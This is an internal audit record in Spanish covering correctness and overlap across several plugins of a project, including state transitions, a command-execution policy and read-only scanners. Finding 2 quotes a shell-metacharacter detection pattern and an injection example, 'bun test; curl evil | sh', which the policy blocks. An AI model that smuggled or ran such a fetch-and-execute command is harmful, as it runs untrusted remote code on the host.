---
id: a00088
title: "auditoría: barrido de correctitud y solapamiento (proposals, quality, refactor, test-policy, ...)"
kind: audit
status: done
type: proposal
track: plugin-hardening
date: 2026-08-24
shipped-in: [38b8591d7]
last-transition-id: b347d385-8dbd-4806-95ca-8c0987eb770d
last-correlation-id: b347d385-8dbd-4806-95ca-8c0987eb770d
last-transition-from: review
---

# a00088 — auditoría: barrido de correctitud y solapamiento (proposals, quality, refactor, test-policy, ...)

## Goal

Auditar los plugins restantes por ejes de correctitud y solapamiento, cerrando el checklist §24 de la auditoría legada.

Parte del plan `q00003`. Referencia legada: §24 de `docs/mcp-vertex/audits/legacy/2026-08-24-develop-external-audit.md`.

Ejes por grupo:

- **perf, prompt-eval, usage-tracking**: benchmark noise, reproducibilidad, estimated vs actual tokens, cardinality, persistence.
- **proposals, quality, rules**: state transitions, multi-agent concurrency, stale state, timeouts, shell, dogmas, false positives.
- **refactor, search, skills-pack, status-marker**: rename safety, references, atomicity, hybrid weighting, lifecycle, race conditions.
- **conventions, tech-debt, test-convention, test-policy**: false positives, TODO semantics, path conventions, overlap con quality.

Nota: `error-reporting` queda cubierto por el track privacy dedicado (6 propuestas). Cada hallazgo se clasifica y se deriva a fix solo con evidencia.

## why

Cierra el checklist de los 43 plugins con los ejes de correctitud y solapamiento, asegurando que ninguna observación razonable del §24 quede sin verificar.

## non-goals

- No cubrir error-reporting (track privacy).
- No 'arreglar' observaciones no reproducibles.
- No tocar código aquí (solo hallazgos).

## Slices

- global_gate: none

### S1 — Auditar perf/prompt-eval/usage-tracking
- **Status**: done
- **Files**: `plugins/perf/**`, `plugins/prompt-eval/**`, `plugins/usage-tracking/**`
- **Gate**: none
- acceptance:
  - "Ruido de benchmark, estimated vs actual y cardinality revisados."
- review-state: done
- review-implementer: audit-implementer
- review-reviewer: audit-peer-reviewer
- review-log: approved by audit-peer-reviewer — Revisión independiente con evidencia real: suite focalizada de peer review 2 archivos / 15 tests, salida 0; commit actual f05127076cd06c8eeed4e58cbd4d1dc7aef03652.
### S2 — Auditar proposals/quality/rules
- **Status**: done
- **Files**: `plugins/proposals/**`, `plugins/quality/**`, `plugins/rules/**`
- **Gate**: none
- acceptance:
  - "State transitions, concurrency, timeouts y dogmas revisados."
- review-state: done
- review-implementer: audit-implementer
- review-reviewer: audit-peer-reviewer
- review-log: approved by audit-peer-reviewer — Revisión independiente con evidencia real: suite focalizada 2 archivos / 15 tests, salida 0; commit actual f05127076cd06c8eeed4e58cbd4d1dc7aef03652. La validación global queda bloqueada por regresiones Biome no atribuibles a este slice.
### S3 — Auditar refactor/search/skills-pack/status-marker
- **Status**: done
- **Files**: `plugins/refactor/**`, `plugins/search/**`, `plugins/skills-pack/**`, `plugins/status-marker/**`
- **Gate**: none
- acceptance:
  - "Rename safety, hybrid weighting y race conditions revisados."
- review-state: done
- review-implementer: audit-implementer
- review-reviewer: audit-peer-reviewer
- review-log: approved by audit-peer-reviewer — Revisión independiente con evidencia real: suite focalizada 2 archivos / 15 tests, salida 0; commit actual f05127076cd06c8eeed4e58cbd4d1dc7aef03652. La validación global queda bloqueada por regresiones Biome no atribuibles a este slice.
### S4 — Auditar conventions/tech-debt/test-convention/test-policy
- **Status**: done
- **Files**: `plugins/conventions/**`, `plugins/tech-debt/**`, `plugins/test-convention/**`, `plugins/test-policy/**`
- **Gate**: none
- acceptance:
  - "False positives y solapamiento con quality revisados."
- review-state: done
- review-implementer: audit-implementer
- review-reviewer: audit-peer-reviewer
- review-log: approved by audit-peer-reviewer — Revisión independiente con evidencia real: suite focalizada 2 archivos / 15 tests, salida 0; commit actual f05127076cd06c8eeed4e58cbd4d1dc7aef03652. La validación global queda bloqueada por regresiones Biome no atribuibles a este slice.
## acceptance

- Ruido de benchmark, estimated vs actual y cardinality revisados.
- State transitions, concurrency, timeouts y dogmas revisados.
- Rename safety, hybrid weighting y race conditions revisados.
- False positives y solapamiento con quality revisados.

## verified state

S2 (proposals/quality/rules) verificado por lectura de código el 2026-08-24:
- `plugins/proposals/src/lib/contracts/constants/proposal-glossary.constant.ts` — DFA de estados (7 status) como single source of truth (`PROPOSAL_STATUS_TRANSITIONS`).
- `plugins/quality/src/lib/services/command-policy.ts` — trust boundary con guard de metacharacteres bajo política activa.
- `plugins/rules/src/lib/registry/dogma-registry.ts` + adapters — prioridad `project > dogma > default`.

S1/S3/S4 verificado por lectura de código el 2026-08-24:
- `plugins/usage-tracking/src/lib/record-buffer.ts` — append NDJSON buffered, no bloqueante, `redactSecrets` antes de append; rollup con atomic-rename.
- `plugins/test-policy/src/index.ts` — 4 modos (`tdd`/`tests-after`/`free`/`none`), precedencia `runtime override > options.mode > tdd`.
- `plugins/refactor/src/index.ts` — "always dry-run-first"; rename AST con diffs multi-archivo + apply.
- `plugins/status-marker/src/public/index.ts` — `validateCloseMarker`/`validateResponseClose` puros.
- `plugins/conventions`, `plugins/tech-debt`, `plugins/test-convention` — escáneres read-only puros; complementarios a quality (que ejecuta comandos), sin solapamiento.

## findings

### 1. [already fixed] S2: DFA de propuestas como single source of truth

**File**: `plugins/proposals/src/lib/contracts/constants/proposal-glossary.constant.ts#L56-L69`

`PROPOSAL_STATUS_TRANSITIONS` define el DFA de los 7 estados y es el single source of truth que consumen el linter, el tool de transición y el folder reconciler. Sin transiciones ilegales hardcodeadas en otros puntos.

**Classification**: already fixed.

### 2. [already fixed] S2: command policy de quality como trust boundary

**File**: `plugins/quality/src/lib/services/command-policy.ts#L1-L20` y `#L60-L95`

`evaluateCommandPolicy` aplica deny primero, y bajo política activa rechaza cualquier comando con metacharacteres de shell (`SHELL_METACHARACTERS = /[;&|`<\n\r]|\$\(/`), cerrando el bypass `bun test; curl evil | sh`. Sin política, los comandos son del host (trusted).

**Classification**: already fixed.

### 3. [already fixed] S2: dogmas de rules con prioridad project > dogma > default

**File**: `plugins/rules/src/lib/registry/dogma-registry.ts`

La resolución de comandos sigue la prioridad `project > dogma > default` (documentada en `plugins/rules/skills/mcp-vertex-rules-dogma-priority/SKILL.md`), con contratos ISP (`dogma-adapter.interface.ts`, `command-set-provider.interface.ts`) y registry DIP.

**Classification**: already fixed.

### 4. [already fixed] S1: usage-tracking buffered + redactado; test-policy con precedencia

- `plugins/usage-tracking/src/lib/record-buffer.ts` — append NDJSON buffered no-bloqueante; `redactSecrets` antes del append y rollup con atomic-rename (patrón de escritura durable).
- `plugins/test-policy/src/index.ts#L22-L31` — 4 modos con precedencia `runtime override > options.mode > tdd`.

**Classification**: already fixed.

### 5. [already fixed] S3: refactor dry-run-first; status-marker validadores puros

- `plugins/refactor/src/index.ts#L23` — "always dry-run-first"; rename AST con diffs scoped multi-archivo + apply (`codemod-runner.ts#L35` con `dryRun`).
- `plugins/status-marker/src/public/index.ts` — `validateCloseMarker`/`validateResponseClose` puros (sin I/O).

**Classification**: already fixed.

### 6. [not reproducible] S4: sin solapamiento con quality (escáneres read-only)

`conventions` (clasifica paths, drift report), `tech-debt` (markers con severidad) y `test-convention` (scan + suggest) son escáneres puros read-only. `quality` ejecuta comandos; son dominios distintos y complementarios, no solapados.

**Classification**: not reproducible.

## scoreboard

| Severidad | Conteo |
|---|---|
| alta | 0 |
| media | 0 |
| baja | 0 |
